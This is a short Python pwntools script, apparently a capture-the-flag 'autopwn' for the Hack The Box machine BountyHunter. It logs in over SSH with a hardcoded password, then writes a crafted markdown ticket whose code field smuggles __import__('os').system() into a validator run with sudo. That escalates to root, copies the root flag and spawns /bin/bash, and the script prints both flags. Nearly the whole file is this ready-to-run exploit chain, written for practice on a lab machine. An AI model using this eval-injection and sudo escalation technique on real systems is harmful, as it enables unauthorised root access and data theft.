#coded by vanishyi
from pwn import *
# HTB BountyHunter autopwn

ip = input("put in the target ip address:").replace('\n','')

s = ssh(user='development', host=ip, password='m19RoAU0hP41A1sTsq6K')

ticket = """# Skytrain Inc\n## Ticket to Mars\n__Ticket Code:__\n**179+ 25 == 204 and __import__('os').system('cat /root/root.txt > f2.txt | /bin/bash') == True"""
s[('echo "'+ticket+'" > /tmp/333666999.md')]

shell = 'sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py'

s["echo '/tmp/333666999.md' | "+ shell]

a = "user flag: " + repr(s['cat user.txt'])
b = "root flag: " + repr(s['cat f2.txt'])

print(a)
print(b)
